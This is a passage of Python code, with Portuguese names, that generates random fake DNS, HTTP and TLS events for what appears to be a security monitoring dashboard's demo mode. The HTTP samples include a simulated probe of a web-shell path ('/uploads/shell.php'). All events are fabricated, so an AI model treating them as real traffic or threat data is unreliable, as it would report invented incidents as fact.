                "status":        random.choice(["novo", "novo", "investigando", "resolvido", "falso"]),
                "id":            f"demo-tl-{i}-{j}",
            })

    doms = [
        "update.microsoft.com", "api.telegram.org", "cdn.cloudflare.com",
        "raw.githubusercontent.com", "fonts.googleapis.com", "graph.facebook.com",
    ]
    for i in range(random.randint(8, 20)):
        ts = (agora - timedelta(minutes=random.randint(1, horas * 60))).isoformat()
        eventos.append({
            "tipo": "dns", "timestamp": ts, "severidade": "informativo",
            "titulo": random.choice(doms), "detalhe": "tipo=A rcode=NOERROR",
        })

    paths = ["/api/v1/data", "/wp-admin/", "/uploads/shell.php", "/login", "/robots.txt"]
    for i in range(random.randint(4, 12)):
        ts = (agora - timedelta(minutes=random.randint(1, horas * 60))).isoformat()
        eventos.append({
            "tipo": "http", "timestamp": ts, "severidade": "informativo",
            "titulo": f"GET {random.choice(paths)}",
            "detalhe": f"status={random.choice([200, 403, 404, 500])} · python-requests/2.28.1",
            "status_code": random.choice([200, 403, 404]), "metodo": "GET", "hostname": "192.168.1.20",
        })

    snis = [
        "api.telegram.org", "cdn.discordapp.com", "raw.githubusercontent.com",
        "graph.facebook.com", "accounts.google.com",
    ]
    for i in range(random.randint(3, 10)):
        ts = (agora - timedelta(minutes=random.randint(1, horas * 60))).isoformat()
        eventos.append({
            "tipo": "tls", "timestamp": ts, "severidade": "informativo",
            "titulo": random.choice(snis),
            "detalhe": "TLS 1.3 · ja3=a0e9f5d64349fb13191bc781f81f42e1",
            "versao": "TLS 1.3", "ja3": "a0e9f5d64349fb13191bc781f81f42e1",
        })

    eventos.sort(key=lambda x: x["timestamp"], reverse=True)
    return eventos